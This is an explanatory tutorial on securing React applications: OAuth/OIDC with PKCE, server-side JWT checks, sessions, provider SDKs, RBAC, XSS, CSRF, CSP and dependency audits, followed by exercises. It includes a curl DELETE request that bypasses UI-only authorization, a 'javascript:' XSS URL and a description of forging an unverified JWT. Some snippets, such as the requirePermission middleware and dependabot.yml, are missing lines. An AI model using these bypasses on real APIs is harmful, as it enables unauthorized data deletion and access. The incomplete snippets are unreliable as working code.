1. Why React does not "do" security for you

React is a library for building user interfaces. It renders components and reconciles the DOM, but it ships no login system, no session store, no permission model and no server. Authentication (proving who a user is) and authorization (deciding what that user may do) are therefore built from three parts: an identity provider or authentication service, a backend that owns data and enforces rules, and a frontend integration library that drives the login flow and attaches credentials to requests.

The single most important consequence is that everything React renders runs on a machine the user controls. Code shipped to the browser can be read, modified and bypassed with developer tools or a plain HTTP client. A hidden button or a guarded route improves the user experience, but it does not protect anything. OWASP ranks broken access control as the number one web application risk in its 2025 Top 10, and explicitly lists "bypassing access control checks by modifying the URL ... internal application state, or the HTML page" and "accessing API with missing access controls" among its common forms[1].

Core rule. Hiding a button or restricting a React route is not authorization. Every request that reads or changes protected data must be authenticated and authorized by the backend, on every request, regardless of what the UI shows[1,2].

3. OAuth 2.0

3.1 What it is

OAuth 2.0 is an authorization framework. It lets a client application obtain limited access to a protected resource on behalf of a resource owner, by obtaining an access token from an authorization server rather than handling the owner's credentials directly[3]. The specification defines four roles: resource owner, resource server, client and authorization server[3]. Access tokens are most commonly presented as bearer tokens in the HTTP Authorization: Bearer header, which means that any party in possession of the token can use it[4].

OAuth on its own does not tell the client who the user is; that is the job of OpenID Connect (Section 4).

3.2 The flow to use from a React app: authorization code with PKCE

A React single-page application is a public client: it cannot keep a client secret, because all its code is delivered to the browser[3,5]. Proof Key for Code Exchange (PKCE) protects the authorization code against interception by binding it to a one-time secret, the code_verifier, that only the original client knows; the client sends a hashed code_challenge with the authorization request and the verifier with the token request[6].

The OAuth 2.0 Security Best Current Practice (RFC 9700) updates the original guidance. It states that public clients MUST use PKCE, that clients SHOULD use the S256 challenge method, that the implicit grant SHOULD NOT be used, and that the resource owner password credentials grant MUST NOT be used[7]. It also requires exact string matching of redirect URIs[7].

  1. The app generates a random code_verifier and derives code_challenge = BASE64URL(SHA256(code_verifier))[6].
  2. The browser is redirected to the authorization endpoint with response_type=code, client_id, redirect_uri, scope, state, code_challenge and code_challenge_method=S256.
  3. The user authenticates at the authorization server, which redirects back with code and the same state.
  4. The client exchanges the code plus code_verifier at the token endpoint. The server recomputes the challenge and only issues tokens if it matches[6].

You will almost never write this flow by hand; the SDKs in Section 8 implement it. It is still worth seeing once, because it makes the SDKs less magical:

pkce.js (illustrative; use a maintained SDK in production)

// Generate a high-entropy code_verifier (RFC 7636 §4.1: 43-128 chars)
function base64url(bytes) {
  return btoa(String.fromCharCode(...new Uint8Array(bytes)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

export async function createPkcePair() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
  return { verifier, challenge: base64url(digest) };
}

export async function startLogin({ authorizeUrl, clientId, redirectUri, scope }) {
  const { verifier, challenge } = await createPkcePair();
  const state = base64url(crypto.getRandomValues(new Uint8Array(16)));
  sessionStorage.setItem('pkce_verifier', verifier);
  sessionStorage.setItem('oauth_state', state);

  const url = new URL(authorizeUrl);
  url.search = new URLSearchParams({
    response_type: 'code',
    client_id: clientId,
    redirect_uri: redirectUri,
    scope,
    state,
    code_challenge: challenge,
    code_challenge_method: 'S256',
  });
  window.location.assign(url);
}

3.3 Where should the tokens live? Three architectures

RFC 10017, OAuth 2.0 for Browser-Based Applications (BCP 212, published August 2026), describes three architectural patterns for JavaScript apps[5]:

PatternHow it worksSecurity properties
Backend for Frontend (BFF)A server-side component is the OAuth client (a confidential client). It holds the tokens and gives the browser only an HttpOnly session cookie; it proxies API calls.Tokens never reach JavaScript, so XSS cannot exfiltrate them. Strongest option; recommended for business and sensitive applications[5].
Token-mediating backendA backend obtains tokens as a confidential client, keeps refresh tokens, and passes access tokens to the browser.Refresh tokens are protected, but access tokens are still exposed to JavaScript[5].
Browser-based OAuth clientThe SPA itself is a public client and holds all tokens.Simplest to deploy; most exposed to token theft if an attacker gets script execution[5].

The key insight in RFC 10017 is that once an attacker can run JavaScript in your origin, they can act as the user no matter where tokens are stored. Storage choices change how much damage they can do (for example, whether a long-lived refresh token can be stolen and used offline), not whether XSS is dangerous[5]. Preventing XSS (Section 11) is therefore a precondition for any token strategy.

4. OpenID Connect (OIDC)

OpenID Connect 1.0 is "a simple identity layer on top of the OAuth 2.0 protocol"[8]. Adding the openid scope to an authorization request asks the provider to return an ID token: a JWT that contains claims about the authentication event and the user, such as iss (issuer), sub (subject identifier), aud (audience, which must contain the client's client_id), exp, iat and, when sent in the request, nonce[8]. OIDC also defines a UserInfo endpoint and a discovery document at /.well-known/openid-configuration[8,9].

ID tokenAccess token
Defined byOpenID Connect Core[8]OAuth 2.0[3]; JWT profile in RFC 9068[10]
AudienceThe client application (aud = client_id)The resource server / API
PurposeTell the client who logged inAuthorize calls to an API
Send it to your API?No. Its audience is the client, not the API.Yes, as a bearer token[4]

The client must validate an ID token before trusting it: check the signature, that iss matches the provider, that aud contains its client ID, that the token is not expired and that nonce matches the value it sent[8]. SDKs do this for you; a backend that receives tokens must do the equivalent for access tokens (Section 5).

5. JSON Web Tokens (JWT)

5.1 Structure

A JWT is a compact, URL-safe means of representing claims, encoded as a JSON object that is the payload of a JSON Web Signature (JWS) or JSON Web Encryption (JWE) structure[11]. A signed JWT has three base64url-encoded parts separated by dots: header, payload and signature[12]. Registered claims include iss, sub, aud, exp, nbf, iat and jti[11].

Signed is not secret. A JWS-signed JWT is only base64url-encoded, so anyone holding it can read the payload[12]. Never put secrets in a JWT, and never treat decoding a token in React (for example, to read a roles claim) as verification. Only the server, using the issuer's keys, can verify it.

5.2 Validating JWTs on the server

RFC 8725, JSON Web Token Best Current Practices, documents real attacks against JWT implementations, including accepting the "none" algorithm and algorithm-substitution attacks, and requires libraries to let callers specify the allowed algorithms and applications to validate issuer and audience[13]. For access tokens issued as JWTs, RFC 9068 additionally specifies the typ header value at+jwt and requires resource servers to validate iss, aud, exp and the signature[10].

The following Express middleware uses the jose library, which fetches and caches the provider's JSON Web Key Set (JWKS) and verifies signature, issuer, audience, expiry and algorithm in one call[14].

server/auth.js

import { createRemoteJWKSet, jwtVerify } from 'jose';

const ISSUER = process.env.OIDC_ISSUER;        // e.g. https://login.example.com/
const AUDIENCE = process.env.API_AUDIENCE;     // e.g. https://api.example.com
const JWKS = createRemoteJWKSet(new URL('.well-known/jwks.json', ISSUER));

export async function requireAuth(req, res, next) {
  const header = req.get('authorization') ?? '';
  const [scheme, token] = header.split(' ');
  if (scheme !== 'Bearer' || !token) {
    return res.status(401).set('WWW-Authenticate', 'Bearer').end();
  }
  try {
    const { payload } = await jwtVerify(token, JWKS, {
      issuer: ISSUER,
      audience: AUDIENCE,
      algorithms: ['RS256'],      // never accept "none" or unexpected algs (RFC 8725)
      clockTolerance: '30s',
    });
    req.user = {
      id: payload.sub,
      roles: Array.isArray(payload.roles) ? payload.roles : [],
      scope: typeof payload.scope === 'string' ? payload.scope.split(' ') : [],
    };
    next();
  } catch {
    res.status(401).set('WWW-Authenticate', 'Bearer error="invalid_token"').end();
  }
}

The JWKS path differs by provider. Read jwks_uri from the provider's discovery document rather than guessing[9].

6. Session management and token storage

A session is the server's memory that a sequence of requests comes from the same authenticated user. OWASP's Session Management Cheat Sheet recommends that session identifiers have at least 64 bits of entropy, be generated by a cryptographically secure generator, be regenerated after login and privilege changes, and expire after both idle and absolute timeouts; it also recommends invalidating the session on the server at logout, not just deleting the cookie[15].

6.1 Cookie sessions vs. bearer tokens in the browser

Server session + HttpOnly cookie (BFF)Access token held by the SPA
Readable by injected script?No: HttpOnly cookies are not exposed to document.cookie[16]Yes, if in memory or Web Storage the page's scripts can reach it
Sent automatically?Yes, so CSRF defences are needed (Section 12)No; attached explicitly, so classic CSRF does not apply
RevocationImmediate: delete the server-side sessionUsually waits for expiry unless introspection or a deny list is used
Typical librariesAuth.js, Clerk (session cookie), custom BFFAuth0 React, MSAL React, Keycloak JS, Amplify, Firebase

OWASP's HTML5 Security Cheat Sheet advises against storing session identifiers in localStorage, because any script on the origin can read it and it persists after the browser closes[17]. SDKs that keep tokens in the browser generally default to in-memory or sessionStorage caches for this reason; for example, the Auth0 SPA SDK uses an in-memory cache by default[18].

6.2 A minimal BFF session in Express

server/session.js

import session from 'express-session';
import RedisStore from 'connect-redis';
import { redis } from './redis.js';

export const sessionMiddleware = session({
  name: '__Host-sid',                // __Host- prefix: Secure, Path=/, no Domain
  secret: process.env.SESSION_SECRET,
  store: new RedisStore({ client: redis }),
  resave: false,
  saveUninitialized: false,
  rolling: true,                     // idle timeout refreshes on activity
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 30 * 60 * 1000,          // 30-minute idle timeout
  },
});

// After a successful login callback: prevent session fixation
export function establishSession(req, user) {
  return new Promise((resolve, reject) =>
    req.session.regenerate(err => {
      if (err) return reject(err);
      req.session.user = { id: user.id, roles: user.roles };
      req.session.createdAt = Date.now();    // enforce an absolute timeout elsewhere
      resolve();
    }));
}

export function logout(req, res) {
  req.session.destroy(() => {           // invalidate server-side, not only the cookie
    res.clearCookie('__Host-sid', { path: '/', secure: true, httpOnly: true, sameSite: 'lax' });
    res.status(204).end();
  });
}

8.1 Auth0 React SDK

@auth0/auth0-react wraps the Auth0 SPA SDK. Auth0Provider configures the tenant; the useAuth0 hook exposes isAuthenticated, user, loginWithRedirect, logout and getAccessTokenSilently, and withAuthenticationRequired protects components[18,31]. To receive an access token for your own API, pass that API's identifier as the audience[31].

src/main.jsx

import { createRoot } from 'react-dom/client';
import { Auth0Provider } from '@auth0/auth0-react';
import App from './App';

createRoot(document.getElementById('root')).render(
  <Auth0Provider
    domain={import.meta.env.VITE_AUTH0_DOMAIN}
    clientId={import.meta.env.VITE_AUTH0_CLIENT_ID}
    authorizationParams={{
      redirect_uri: window.location.origin,
      audience: 'https://api.example.com',   // your API identifier
      scope: 'openid profile email read:invoices',
    }}
  >
    <App />
  </Auth0Provider>
);

src/Invoices.jsx

import { useEffect, useState } from 'react';
import { useAuth0, withAuthenticationRequired } from '@auth0/auth0-react';

function Invoices() {
  const { getAccessTokenSilently } = useAuth0();
  const [invoices, setInvoices] = useState([]);

  useEffect(() => {
    (async () => {
      const token = await getAccessTokenSilently();
      const res = await fetch('/api/invoices', {
        headers: { Authorization: `Bearer ${token}` },
      });
      if (res.ok) setInvoices(await res.json());
    })();
  }, [getAccessTokenSilently]);

  return <ul>{invoices.map(i => <li key={i.id}>{i.number}</li>)}</ul>;
}

// Redirects to login if not authenticated. UX only: the API must still check the token.
export default withAuthenticationRequired(Invoices);

8.2 Clerk

Clerk provides hosted sign-in components and user management. Since Clerk Core 3 (March 2026), the React package is @clerk/react (previously @clerk/clerk-react) and the <SignedIn>/<SignedOut> control components are replaced by <Show>[32]. The useAuth() hook returns the session state and a getToken() function that yields a session token to send to your backend[23].

src/App.jsx

import { ClerkProvider, Show, SignInButton, UserButton, useAuth } from '@clerk/react';

function Reports() {
  const { getToken } = useAuth();
  async function load() {
    const token = await getToken();
    const res = await fetch('https://api.example.com/reports', {
      headers: { Authorization: `Bearer ${token}` },
    });
    console.log(await res.json());
  }
  return <button onClick={load}>Load reports</button>;
}

export default function App() {
  return (
    <ClerkProvider publishableKey={import.meta.env.VITE_CLERK_PUBLISHABLE_KEY}>
      <Show when="signed-out"><SignInButton /></Show>
      <Show when="signed-in"><UserButton /><Reports /></Show>
    </ClerkProvider>
  );
}

8.3 Firebase Authentication

Firebase Authentication supports email/password, phone and federated providers. In the browser, onAuthStateChanged reports sign-in state and user.getIdToken() returns a Firebase ID token[24]. Firebase's documentation states that when your client calls a custom backend, you should send the ID token over HTTPS and verify it on the server with the Admin SDK's verifyIdToken(), rather than trusting a user ID sent by the client[25].

src/firebase.js

import { initializeApp } from 'firebase/app';
import { getAuth, GoogleAuthProvider, signInWithPopup, onAuthStateChanged } from 'firebase/auth';

const app = initializeApp({
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,   // identifies the project; not a secret
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
});
export const auth = getAuth(app);
export const signIn = () => signInWithPopup(auth, new GoogleAuthProvider());

export async function apiFetch(path, init = {}) {
  const token = await auth.currentUser?.getIdToken();
  return fetch(path, { ...init, headers: { ...init.headers, Authorization: `Bearer ${token}` } });
}
export { onAuthStateChanged };

server/firebase-auth.js

import { initializeApp } from 'firebase-admin/app';
import { getAuth } from 'firebase-admin/auth';
initializeApp();

export async function requireFirebaseUser(req, res, next) {
  const token = (req.get('authorization') ?? '').replace(/^Bearer /, '');
  try {
    const decoded = await getAuth().verifyIdToken(token, /* checkRevoked */ true);
    req.user = { id: decoded.uid, admin: decoded.admin === true }; // custom claim
    next();
  } catch {
    res.sendStatus(401);
  }
}

Roles can be stored as custom claims set from the Admin SDK on the server; Firebase Security Rules or your API then read them from the verified token[33].

8.4 AWS Amplify

Amplify (Gen 2) configures an Amazon Cognito user pool as the authentication backend and provides the <Authenticator> UI component in @aws-amplify/ui-react[26,34]. fetchAuthSession() from aws-amplify/auth returns the current Cognito tokens.

src/App.jsx

import { Amplify } from 'aws-amplify';
import { fetchAuthSession } from 'aws-amplify/auth';
import { Authenticator } from '@aws-amplify/ui-react';
import '@aws-amplify/ui-react/styles.css';
import outputs from '../amplify_outputs.json';

Amplify.configure(outputs);

async function callApi() {
  const { tokens } = await fetchAuthSession();
  return fetch('https://api.example.com/orders', {
    headers: { Authorization: `Bearer ${tokens?.accessToken?.toString()}` },
  });
}

export default function App() {
  return (
    <Authenticator>
      {({ signOut, user }) => (
        <main>
          <p>Signed in as {user?.signInDetails?.loginId}</p>
          <button onClick={callApi}>Load orders</button>
          <button onClick={signOut}>Sign out</button>
        </main>
      )}
    </Authenticator>
  );
}

Cognito places group membership in the cognito:groups claim of its tokens, which a backend authorizer can map to roles after verifying the signature[35].

8.5 MSAL React

@azure/msal-react builds on @azure/msal-browser to sign users in with the Microsoft identity platform (Microsoft Entra ID). You create a PublicClientApplication, wrap the app in MsalProvider, and use useMsal, AuthenticatedTemplate and UnauthenticatedTemplate in components[27]. Tokens are obtained with acquireTokenSilent, falling back to an interactive request when user interaction is required[27].

src/main.jsx

import { createRoot } from 'react-dom/client';
import { PublicClientApplication } from '@azure/msal-browser';
import { MsalProvider } from '@azure/msal-react';
import App from './App';

const msal = new PublicClientApplication({
  auth: {
    clientId: import.meta.env.VITE_ENTRA_CLIENT_ID,
    authority: `https://login.microsoftonline.com/${import.meta.env.VITE_ENTRA_TENANT_ID}`,
    redirectUri: '/',
  },
  cache: { cacheLocation: 'sessionStorage' },
});

await msal.initialize();   // required before other MSAL calls in msal-browser v3+
createRoot(document.getElementById('root')).render(
  <MsalProvider instance={msal}><App /></MsalProvider>
);

src/App.jsx

import { AuthenticatedTemplate, UnauthenticatedTemplate, useMsal } from '@azure/msal-react';
import { InteractionRequiredAuthError } from '@azure/msal-browser';

const apiRequest = { scopes: ['api://my-api-client-id/Invoices.Read'] };

export default function App() {
  const { instance, accounts } = useMsal();

  async function callApi() {
    const request = { ...apiRequest, account: accounts[0] };
    let result;
    try {
      result = await instance.acquireTokenSilent(request);
    } catch (e) {
      if (e instanceof InteractionRequiredAuthError) return instance.acquireTokenRedirect(request);
      throw e;
    }
    await fetch('/api/invoices', { headers: { Authorization: `Bearer ${result.accessToken}` } });
  }

  return (
    <>
      <AuthenticatedTemplate><button onClick={callApi}>Invoices</button></AuthenticatedTemplate>
      <UnauthenticatedTemplate>
        <button onClick={() => instance.loginRedirect(apiRequest)}>Sign in</button>
      </UnauthenticatedTemplate>
    </>
  );
}

8.6 Keycloak JS

keycloak-js is the official JavaScript adapter for Keycloak, an open-source identity and access management server. You construct a Keycloak instance with the server URL, realm and client ID, call init() (for example with onLoad: 'check-sso' and pkceMethod: 'S256'), read keycloak.token, and call updateToken(minValidity) to refresh it before use[28]. Helper methods such as hasRealmRole() read roles from the token for display purposes[28].

src/keycloak.jsx

import Keycloak from 'keycloak-js';
import { createContext, useContext, useEffect, useRef, useState } from 'react';

const keycloak = new Keycloak({
  url: 'https://sso.example.com',
  realm: 'acme',
  clientId: 'acme-web',
});

const KeycloakContext = createContext(null);

export function KeycloakProvider({ children }) {
  const [ready, setReady] = useState(false);
  const started = useRef(false);            // React StrictMode runs effects twice in dev

  useEffect(() => {
    if (started.current) return;
    started.current = true;
    keycloak.init({
      onLoad: 'check-sso',
      pkceMethod: 'S256',
      silentCheckSsoRedirectUri: `${window.location.origin}/silent-check-sso.html`,
    }).then(() => setReady(true));
  }, []);

  if (!ready) return <p>Loading…</p>;
  return <KeycloakContext.Provider value={keycloak}>{children}</KeycloakContext.Provider>;
}

export const useKeycloak = () => useContext(KeycloakContext);

export async function kcFetch(url, init = {}) {
  await keycloak.updateToken(30);           // refresh if it expires within 30 s
  return fetch(url, { ...init, headers: { ...init.headers, Authorization: `Bearer ${keycloak.token}` } });
}

8.7 NextAuth.js / Auth.js

Auth.js (the successor name of NextAuth.js; next-auth v5 for Next.js) is a server-side authentication library. It runs on your server, performs the OAuth/OIDC exchange as a confidential client, and stores the session in an encrypted cookie or, with a database adapter, in a database[29,30]. Architecturally this is close to the BFF pattern: provider tokens do not need to reach React code. In September 2025 the Auth.js project announced that it is now maintained by the Better Auth team[36]; check the project's current guidance before starting a new application.

auth.ts

import NextAuth from 'next-auth';
import GitHub from 'next-auth/providers/github';

export const { handlers, auth, signIn, signOut } = NextAuth({
  providers: [GitHub],
  callbacks: {
    // Copy a role from your own database into the session token on sign-in.
    async jwt({ token, user }) {
      if (user) token.role = await lookupRole(user.email);  // your function
      return token;
    },
    async session({ session, token }) {
      session.user.role = token.role;
      return session;
    },
  },
});

app/api/auth/[...nextauth]/route.ts

import { handlers } from '@/auth';
export const { GET, POST } = handlers;

app/api/admin/users/route.ts

import { auth } from '@/auth';

export async function GET() {
  const session = await auth();                       // verified on the server
  if (!session) return new Response(null, { status: 401 });
  if (session.user.role !== 'admin') return new Response(null, { status: 403 });
  return Response.json(await listUsers());
}

9. Role-based access control (RBAC)

In RBAC, permissions are assigned to roles, and users acquire permissions by being assigned to roles; the NIST model formalises this as core RBAC (users, roles, permissions, sessions) with optional role hierarchies and separation-of-duty constraints[37]. RBAC makes policies easier to review than per-user grants, but roles alone cannot express rules such as "a user may edit only their own invoices". OWASP therefore recommends enforcing least privilege, denying by default, checking permissions on every request, and considering attribute- or relationship-based checks where ownership matters[2].

9.1 Model permissions, not just roles

Check for permissions in code and map roles to permissions in one place. Adding a role then changes data, not dozens of if (role === 'admin') statements.

shared/permissions.js (imported by both server and client)

export const ROLE_PERMISSIONS = {
  viewer:  ['invoice:read'],
  editor:  ['invoice:read', 'invoice:update'],
  admin:   ['invoice:read', 'invoice:update', 'invoice:delete', 'user:manage'],
};

export function can(user, permission) {
  return (user?.roles ?? []).some(r => ROLE_PERMISSIONS[r]?.includes(permission));
}

import { can } from '../shared/permissions.js';

  can(req.user, permission) ? next() : res.sendStatus(403);

  requireAuth,                          // 401 if not authenticated (Section 5)

Where do roles come from? Either from a claim in a verified token (for example a Keycloak realm role, an Entra app role, a Cognito group or a Firebase custom claim) or from your own database keyed by the token's sub. Both are fine as long as the server reads them from a source the user cannot edit.

10.1 A route guard (UX only)

src/RequirePermission.jsx (React Router)

import { Navigate, Outlet } from 'react-router-dom';
import { useCurrentUser } from './useCurrentUser';   // e.g. fetched from GET /api/me
import { can } from '../shared/permissions';

export function RequirePermission({ permission }) {
  const { user, loading } = useCurrentUser();
  if (loading) return null;
  if (!user) return <Navigate to="/login" replace />;
  if (!can(user, permission)) return <Navigate to="/forbidden" replace />;
  return <Outlet />;   // convenience only; the API must re-check
}

10.2 Why that is not enough

Everything in the bundle, including the admin page and the API URLs it calls, is downloadable. An attacker does not need the route at all:

# No React involved. If the server only trusted the UI, this succeeds.
curl -X DELETE https://api.example.com/api/users/42 \
     -H "Authorization: Bearer $ANY_VALID_USER_TOKEN"

10.3 Object-level checks (IDOR)

Changing an ID in a URL to access someone else's record, often called insecure direct object reference, is listed by OWASP as a form of broken access control[1]. A role check does not stop it; an ownership check does. Scope the database query to the authenticated user so that a foreign ID simply returns nothing.

server/invoices.js

app.get('/api/invoices/:id', requireAuth, requirePermission('invoice:read'), async (req, res) => {
  const invoice = await db.invoice.findFirst({
    where: { id: req.params.id, ownerId: req.user.id },   // ownership enforced in the query
  });
  if (!invoice) return res.sendStatus(404);               // do not reveal whether it exists
  res.json(invoice);
});

Rule of thumb. For every API handler, ask two questions: who is this? (authentication, 401 if unknown) and may this user do this to this specific object? (authorization, 403 or 404 if not). Deny by default when either answer is missing[2].

11. Cross-site scripting (XSS)

XSS occurs when an attacker gets a browser to execute script in the context of your origin. That script can read the DOM, call your APIs with the user's cookies or tokens, and read any token reachable from JavaScript[38].

11.1 What React protects

React DOM escapes values embedded in JSX before rendering them, so {userInput} in a text position is rendered as text, not markup[39]. This removes the most common class of DOM XSS. It does not cover:

  • dangerouslySetInnerHTML, which inserts raw HTML; React's documentation warns that it can introduce XSS if the HTML is not trusted or sanitised[40].
  • URL attributes such as href and src: a value like javascript:alert(1) is not text. React began warning about javascript: URLs in version 16.9 and announced that future versions would block them[41]; validate URLs yourself instead of relying on that.
  • Direct DOM access through refs (ref.current.innerHTML = ...), third-party widgets, and server-side templates outside React.
  • Server-rendered state serialised into a <script> tag without escaping.

11.2 Safe patterns

src/SafeHtml.jsx

import DOMPurify from 'dompurify';

// Sanitise untrusted HTML (e.g. rendered Markdown) before inserting it.
export function SafeHtml({ html }) {
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Allow only http(s) links from user data.
export function safeUrl(value) {
  try {
    const url = new URL(value, window.location.origin);
    return ['http:', 'https:'].includes(url.protocol) ? url.href : undefined;
  } catch {
    return undefined;
  }
}

export function ProfileLink({ website }) {
  const href = safeUrl(website);
  return href ? <a href={href} rel="noopener noreferrer" target="_blank">{website}</a> : null;
}

DOMPurify is a widely used DOM-only XSS sanitiser maintained by Cure53[42]. Sanitise as close to the sink as possible, and keep the library updated (Section 14).

Two further controls reduce the impact of any XSS that slips through: a strict Content Security Policy (Section 13), and Trusted Types, which make DOM sinks such as innerHTML reject plain strings unless they pass through a policy you define[43].

12. Cross-site request forgery (CSRF)

CSRF tricks a user's browser into sending an authenticated request that the user did not intend, by exploiting the fact that browsers attach cookies automatically[44]. It matters for cookie-based sessions (BFF, Auth.js, many Clerk setups); it does not apply in the same way to APIs that only accept tokens in an Authorization header, because a cross-site page cannot make the victim's browser attach that header.

The OWASP CSRF Prevention Cheat Sheet recommends a token-based defence (the synchronizer token pattern for stateful apps, or a signed double-submit cookie for stateless ones), and describes SameSite cookies, verifying the Origin header, Fetch Metadata headers and custom request headers as defence-in-depth[44]. It also stresses that any XSS vulnerability defeats all CSRF defences[44]. State-changing operations must never use GET.

server/csrf.js (synchronizer token + origin check)

import crypto from 'node:crypto';

const ALLOWED_ORIGINS = new Set(['https://app.example.com']);

export function issueCsrfToken(req, res) {
  req.session.csrf ??= crypto.randomBytes(32).toString('base64url');
  res.json({ csrfToken: req.session.csrf });
}

export function verifyCsrf(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  // Defence in depth: reject cross-site requests by Origin / Fetch Metadata.
  const origin = req.get('origin');
  if (origin && !ALLOWED_ORIGINS.has(origin)) return res.sendStatus(403);
  if (req.get('sec-fetch-site') === 'cross-site') return res.sendStatus(403);

  const sent = Buffer.from(req.get('x-csrf-token') ?? '');
  const expected = Buffer.from(req.session.csrf ?? '');
  if (sent.length === 0 || sent.length !== expected.length ||
      !crypto.timingSafeEqual(sent, expected)) {
    return res.sendStatus(403);
  }
  next();
}

// app.get('/api/csrf', sessionMiddleware, issueCsrfToken);
// app.use('/api', sessionMiddleware, verifyCsrf);

src/api.js

let csrfToken;

export async function api(path, { method = 'GET', body } = {}) {
  if (method !== 'GET' && !csrfToken) {
    csrfToken = (await (await fetch('/api/csrf', { credentials: 'same-origin' })).json()).csrfToken;
  }
  const res = await fetch(path, {
    method,
    credentials: 'same-origin',
    headers: {
      'Content-Type': 'application/json',
      ...(method !== 'GET' && { 'X-CSRF-Token': csrfToken }),
    },
    body: body && JSON.stringify(body),
  });
  if (res.status === 401) window.location.assign('/login');
  return res;
}

Also make sure your CORS configuration does not undo these protections: never reflect arbitrary Origin values while allowing credentials.

13. Content Security Policy (CSP)

CSP is a response header that tells the browser which sources of script, style, frames and other resources a page may load, and is primarily used to mitigate XSS[45,46]. An allow-list of domains is easy to bypass when any allowed host serves attacker-influenced JavaScript; Google's web.dev guidance therefore recommends a strict CSP based on nonces or hashes together with 'strict-dynamic'[47].

A strict policy (one header, shown on several lines)

Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  require-trusted-types-for 'script'
  • 'nonce-{RANDOM}': only <script> tags carrying this per-response random value run; inline event handlers and injected scripts do not[45,47].
  • 'strict-dynamic': scripts loaded by an already-trusted script are trusted, which suits bundlers that create chunk scripts at runtime[46].
  • frame-ancestors 'none': prevents your app from being framed (clickjacking)[45].
  • require-trusted-types-for 'script': enforces Trusted Types for DOM XSS sinks[43]. Test carefully, as some libraries are not compatible.

Nonces must be unique per response, so they need a server (or edge function) that renders the HTML. For a purely static SPA, use hash-based sources instead, generated at build time. Roll out with Content-Security-Policy-Report-Only first to collect violations without breaking the app[45].

server/csp.js (Express serving the SPA's index.html)

import crypto from 'node:crypto';
import fs from 'node:fs/promises';

const template = await fs.readFile('dist/index.html', 'utf8');

export async function serveIndex(req, res) {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.set('Content-Security-Policy', [
    `script-src 'nonce-${nonce}' 'strict-dynamic'`,
    "object-src 'none'",
    "base-uri 'none'",
    "frame-ancestors 'none'",
  ].join('; '));
  // Add the nonce to every <script> tag emitted by the build.
  res.type('html').send(template.replaceAll('<script', `<script nonce="${nonce}"`));
}

14. Dependency vulnerability scanning

A typical React application ships hundreds of transitive npm packages, and the browser executes all of them with full access to your origin. OWASP added Software Supply Chain Failures as A03 in its 2025 Top 10, covering vulnerable, outdated and compromised components and the build systems that deliver them[48]. React itself is not exempt: in December 2025 the React team disclosed a critical remote-code-execution vulnerability in React Server Components (CVE-2025-55182) affecting the react-server-dom-* packages and frameworks built on them, and urged immediate upgrades[49].

  • npm audit submits the dependency tree to the registry and reports known vulnerabilities; --audit-level sets the severity that produces a non-zero exit code, and npm audit fix applies compatible upgrades[50].
  • Dependabot raises alerts when a repository depends on a package with a known advisory in the GitHub Advisory Database, and can open pull requests to update it[51].
  • OSV-Scanner checks lockfiles against the open OSV vulnerability database[52].
  • Commit lockfiles and install with npm ci in CI so builds use exactly the reviewed versions[53].

.github/workflows/security.yml

name: security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm audit --omit=dev --audit-level=high

.github/dependabot.yml

version: 2

  - package-ecosystem: npm
    directory: /

16. Exercises with solutions

Try each exercise before opening its solution.

Exercise 1. The admin button

A team ships this component and considers the admin feature secure because non-admins never see the button. Identify the vulnerability and fix it.

function UserRow({ user, currentUser }) {
  return (
    <tr>
      <td>{user.email}</td>
      {currentUser.role === 'admin' && (
        <td><button onClick={() => fetch(`/api/users/${user.id}`, { method: 'DELETE' })}>Delete</button></td>
      )}
    </tr>
  );
}

// server
app.delete('/api/users/:id', requireAuth, async (req, res) => {
  await db.user.delete({ where: { id: req.params.id } });
  res.sendStatus(204);
});
Show solution

The server authenticates the caller but never checks authorization. Any logged-in user can send DELETE /api/users/42 with curl; hiding the button only changes what is displayed. This is broken access control[1]. Keep the button logic for UX, and add a server-side permission check (deny by default)[2]:

app.delete('/api/users/:id', requireAuth, requirePermission('user:manage'), async (req, res) => {
  if (req.params.id === req.user.id) return res.status(400).json({ error: 'Cannot delete self' });
  await db.user.delete({ where: { id: req.params.id } });
  res.sendStatus(204);
});

Also note the client should read currentUser from a server endpoint such as /api/me, not from a decoded token or localStorage, though even then it remains a UX hint.

Exercise 2. Someone else's invoice

All users have the viewer role. Explain what is wrong and rewrite the handler.

app.get('/api/invoices/:id', requireAuth, requirePermission('invoice:read'), async (req, res) => {
  res.json(await db.invoice.findUnique({ where: { id: req.params.id } }));
});
Show solution

The role check passes for every viewer, but nothing checks that the invoice belongs to the caller, so changing the ID reveals other customers' invoices (insecure direct object reference)[1]. RBAC answers "may viewers read invoices?" but not "may this user read this invoice?"[2]. Scope the query to the owner and return 404 for anything else:

app.get('/api/invoices/:id', requireAuth, requirePermission('invoice:read'), async (req, res) => {
  const invoice = await db.invoice.findFirst({ where: { id: req.params.id, ownerId: req.user.id } });
  if (!invoice) return res.sendStatus(404);
  res.json(invoice);
});

Using unguessable IDs (UUIDs) is a useful extra layer but not a substitute for the ownership check.

Exercise 3. Decoding is not verifying

List every problem with this middleware, then replace it.

import { jwtDecode } from 'jwt-decode';

app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  req.user = jwtDecode(token);       // { sub, roles, exp, ... }
  next();
});
Show solution
  1. No signature verification: anyone can craft a token with "roles": ["admin"], because a signed JWT's payload is merely base64url-encoded[12].
  2. No iss or aud check, so tokens from another issuer, or an ID token meant for the client, would be accepted[10,13].
  3. No exp check, so expired tokens work forever[11].
  4. No algorithm restriction[13].
  5. Missing or malformed tokens throw or produce undefined instead of a 401 response.

